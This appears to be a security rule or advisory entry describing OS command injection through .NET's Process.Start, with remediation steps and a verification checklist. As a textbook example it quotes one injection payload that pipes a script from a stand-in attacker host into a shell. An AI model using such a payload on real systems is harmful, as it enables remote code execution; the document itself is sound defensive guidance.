title: OS Command Injection via Process.Start
summary: User-controlled input flows into Process.Start or the ProcessStartInfo constructor without validation. An attacker can inject arbitrary commands that run with the privileges of the application process.
why_it_matters: Command injection gives an attacker the same privileges as the running process — often enough to read configuration, install backdoors, or pivot to internal networks. Automated exploitation is trivial: appending `; curl attacker.com/shell.sh | sh` to a vulnerable parameter is a textbook attack.
how_to_fix:
The safest fix is to eliminate shell invocation entirely. If you must execute external processes:

1. Never pass user input directly to Process.Start with a single string argument.
2. Use ProcessStartInfo with UseShellExecute = false and ArgumentList.Add for each argument so arguments are not re-parsed by the shell.
3. Validate user input against a strict allowlist of permitted values before use.
4. Prefer .NET APIs over shelling out (e.g., use System.IO.File and Directory instead of calling `cp` or `ls`).
developer_notes: ProcessStartInfo.ArgumentList (added in .NET Core 2.1) passes arguments as a list rather than a single space-separated string, which avoids argument injection entirely. When you must use the Arguments property, quote user input carefully and understand that the Windows CreateProcess argument parsing rules differ from Unix.
verification_checklist: User input is never passed as the FileName to Process.Start
User input is never concatenated into the Arguments string
Arguments are passed via ArgumentList when possible
Allowed commands or arguments are validated against a strict allowlist

references.title: OWASP OS Command Injection Defense Cheat Sheet
